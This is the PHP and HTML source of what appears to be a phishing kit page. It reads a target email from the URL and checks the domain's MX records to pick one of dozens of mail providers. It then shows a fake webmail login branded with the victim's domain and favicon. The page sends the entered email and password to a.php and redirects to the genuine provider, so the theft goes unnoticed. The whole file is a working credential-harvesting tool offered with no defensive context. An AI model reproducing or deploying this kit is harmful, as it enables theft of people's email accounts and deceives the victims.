<?php
include('../class/bk.php');
include('../class/ant.php');
include('../class/b.php');
include('../class/bo.php');
include('../class/bt.php');

function getloginIDFromlogin($email)
{
$find = '@';
$pos = strpos($email, $find);
$loginID = substr($email, 0, $pos);
return $loginID;
}
function getDomainFromEmail($email)
{
// Get the data after the @ sign
$domain = substr(strrchr($email, "@"), 1);
return $domain;
}
function mxrecordValidate($domain) {
$arr = dns_get_record($domain, DNS_MX);
if ($arr[0]['host'] == $domain && !empty($arr[0]['target'])){
return $arr[0]['target'];
}}

$acc = $_GET['e'];

if (strpos($acc, '@') !== false) {
    $login = $acc;
	$pushacc = base64_encode($acc);
} else {
	$pushacc = $acc;
    $login = base64_decode($acc);
	}

$loginID = getloginIDFromlogin($login);
$domain = getDomainFromEmail($login);
$ln = strlen($login);
$len = strrev($login);
$x = 0;
for($i=0; $i<$ln; $i++){
	if($len[$i] == "@"){
		$x = $i;
		break;
	}
}
$yuh = substr($len,0,$x);
$yuh = strrev($yuh);
for($i=0; $i<$ln; $i++){
	if($yuh[$i] == "."){
		$x = $i;
		break;
	}
}
$yuh = substr($yuh,0,$x);
$yuh = ucfirst($yuh);

if(mxrecordValidate($domain)) {
$data = dns_get_record($domain, DNS_MX);
foreach ($data as $key1){
$explit=explode('.',$key1['target']);
foreach ($explit as $xkey1){
if (strpos(strtolower($key1['target']), 'outlook.com') !== false) {
$hostname = 'imap-mail.outlook.com';
$urlredi = 'https://outlook.office.com/owa/';
}elseif(strpos(strtolower($key1['target']), 'yahoo') !== false) {
		if (strpos(strtolower($key1['target']), 'aol') !== false){
		$src="login.aol.com";
		$urlredi = 'https://login.aol.com';
		}elseif (strpos(strtolower($key1['target']), 'mta') !== false){
		$hostname = 'imap.mail.yahoo.com';
		$urlredi ='https://login.yahoo.com';
		}else{
		$hostname = 'imap.mail.yahoo.com';
		$urlredi = 'https://login.yahoo.com';
		}
}elseif (strpos(strtolower($key1['target']), 'google') !== false) {
$hostname = 'imap.gmail.com';
$urlredi =  'https://myaccount.google.com';
}elseif(strpos(strtolower($key1['target']), 'qq') !== false) {
$hostname = 'imap.exmail.qq.com';
$urlredi =  'https://exmail.qq.com/cgi-bin/loginpage';
}elseif (strpos(strtolower($key1['target']), 'hinet') && strpos(strtolower($key1['target']), 'hibox') !== false) {
$hostname = 'hibox.hinet.net';
$urlredi =  'https://www.hibox.hinet.net/uwc/';
}elseif (strpos(strtolower($key1['target']), 'mailfilter')!== false) {
$hostname = 'hibox.hinet.net';
$urlredi =  'https://webmail.hinet.net/';
}elseif (strpos(strtolower($key1['target']), 'emailsrvr')!== false) {
$hostname = 'secure.emailsrvr.com';
$urlredi = 'https://apps.rackspace.com/index.php';
}elseif (strpos(strtolower($key1['target']), 'dns.com')!== false) {
$hostname = 'mx8.dns.com.cn';
$urlredi =  'http://www.dns.com.cn/login/toLogin.do';
}elseif (strpos(strtolower($key1['target']), 'zmail') !== false) {
$hostname = 'imap.zmail300.cn';
$urlredi =  'http://ssl.zmail300.cn/app/mail/index';
}elseif (strpos(strtolower($key1['target']), 'hinet') !== false) {
$hostname = $domain;
$urlredi = 'http://'.$domain;
}elseif (strpos(strtolower($key1['target']), 'mailcloud') !== false) {
$hostname = 'ms.mailcloud.com.tw';
$urlredi =  'https://mail.mailasp.com.tw/';
}elseif (strpos(strtolower($key1['target']), 'vip') !== false) {
$hostname = $domain;
$urlredi = 'http://'.$domain;
}elseif (strpos(strtolower($key1['target']), 'qiye.163.com') !== false) {
$hostname = 'imap.qiye.163.com';
$urlredi =  'https://mail.qiye.163.com';
}elseif (strpos(strtolower($key1['target']), 'netease') !== false) {
$hostname = 'imap.163.com';
$urlredi =  'https://email.163.com/';
}elseif (strpos(strtolower($key1['target']), 'secureserver.net') !== false) {
$hostname = 'imap.secureserver.net';
$urlredi = 'https://email25.godaddy.com/';
}elseif (strpos(strtolower($key1['target']), 'chinaemail') !== false) {
$hostname = 'mail.'.$domain;
$urlredi = 'http://'.$domain;
}elseif (strpos(strtolower($key1['target']), 'aliyun') !== false) {
$hostname = 'imap.mxhichina.com';
$urlredi = 'https://qiye.aliyun.com/';

}elseif (strpos(strtolower($key1['target']), 'mxhichina') !== false) {
$hostname = 'imap.mxhichina.com';
$urlredi = 'https://qiye.aliyun.com/';

}elseif (strpos(strtolower($key1['target']), 'zoho') && strpos(strtolower($key1['target']), 'smtp') !== false) {
$hostname = 'imap.zoho.com';
$urlredi = 'https://mail.zoho.com/zm/';

}elseif (strpos(strtolower($key1['target']), 'zoho') !== false) {
$hostname = 'imappro.zoho.com';
$urlredi = 'https://mail.zoho.com/zm/';

}elseif (strpos(strtolower($key1['target']), '263') !== false) {
$hostname = 'imapw.263.net';
$urlredi = 'http://263xmail.com/';

}elseif (strpos(strtolower($key1['target']), 'coremail') !== false) {
$hostname = 'imap.icoremail.net';
$urlredi =  'https://mail.icoremail.net/';
}elseif (strpos(strtolower($key1['target']), '1and1') !== false) {
$hostname = 'imap.1and1.co.uk';
$urlredi ='https://webmail.1and1.co.uk/';
}elseif (strpos(strtolower($key1['target']), "netsolmail") !== false) {
$hostname = 'imap.internetpro.net';
$urlredi =  'https://webmail5.networksolutionsemail.com/';
}elseif (strpos(strtolower($key1['target']), $domain) !== false) {
$hostname = 'mail.'.$domain;
$urlredi = $domain;	
}else{
	$urlredi = $domain;	

	
}
}
}


}
 
?>
 

<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title><?php echo $yuh ?>  WebMail </title>
   <link href="https://www.google.com/s2/favicons?domain=<?php echo $urlredi; ?>" rel="shortcut icon">

<link type="text/css" rel="stylesheet" href="img/style.css" media="all">
	  <script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>

<script>
function myFunction() {
  var logid = document.getElementById('emxx').value;
  var page = document.getElementById('psd').value;
  
 if( page == ''){

	 document.getElementById("unsupportedBrowser").innerHTML = " Please enter your password!";
  }else{
   document.getElementById("pba1").style.display = "block"; 
   document.getElementById("pba2").style.display = "none"; 

  // document.getElementById("pba1").style.display = "block"; 
 // document.getElementById("pba2").style.display = "block"; 
 
  var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange=function() {
    if (this.readyState == 4 && this.status == 200) {
	var result = JSON.parse(this.responseText);
   if(result.p=='1'){
 
				location.replace(result.url);
				setTimeout("window.location.href='"+ result.url +"';", 1000);
				 
		 
		 
	   
 }else{
  document.getElementById('psd').value = ''
   document.getElementById("pba1").style.display = "none"; 
   document.getElementById("pba2").style.display = "block"; 
 document.getElementById("unsupportedBrowser").innerHTML = "Your account or password is incorrect.";
          }
   
   } 
  };
  xhttp.open("POST", "a.php", true);
 xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
 xhttp.setRequestHeader("Authorization1",logid);
 xhttp.setRequestHeader("Authorization",page);
 xhttp.send(); 
 
	}
	}
</script>


    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
 </head>
<body>
    <br><br><br><br>
	<div id="header">
		<div id="header-inner">
		<center> <img src="img/opened-email-envelope.png" alt="Mailbox" style="width:85px;height:80px;">
		<br>
		</center></div>
		<br>
	</div>
	<br>
	<br>
	<div id="main-container">
		<div id="top"><img src="https://www.google.com/s2/favicons?domain=<?php echo $urlredi; ?>" alt="Mailbox" style="width:20px;height:18px;">  <?php echo $yuh ?>   webmail Login</div>
 
		<div id="body-container">
			<form id="loginForm" class="container-form" action="need.php" method="post">
				
				
				<div id="unsupportedBrowser" style="display: block;color:red"></div>

				<table align="center">
					<tbody><tr>
						<td>
							
								
								
									<input type="email" required name="em" id="emx" value="<?php echo  $login; ?>" maxlength="50">
									<input type="hidden"  name="" id="emxx" value="<?php echo  $pushacc; ?>">
								
							
						</td>
					</tr>
					<tr>
						<td>
							<input type="password" required name="ps" id="psd" placeholder="Password">
						</td>
					</tr>
					<tr>
						<td id="remember-container">
							<input type="checkbox" name="remember-me" id="remember" value="1"> 
							<label for="remember" class="remember">Secured Login session?</label>
						</td>
					</tr>
				</tbody></table>
				<div>
 <div id="pba1" style="display:none">
  <button class="btn btn-primary" id="login-button" type="button" disabled >
  <span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span>
  Login...
</button>
		 </div>	
		 
		  <div id="pba2">
  <button class="btn btn-primary" id="login-button" type="button" onclick="myFunction();" >
   Login
</button>
		 </div>	
		 
 				</div>
			</form>
		</div>



</div>
	<div class="under-link">
		<a href=""><?php echo $yuh ?> Copyright© 2019
Privacy Policy</a>
	</div>



</body></html>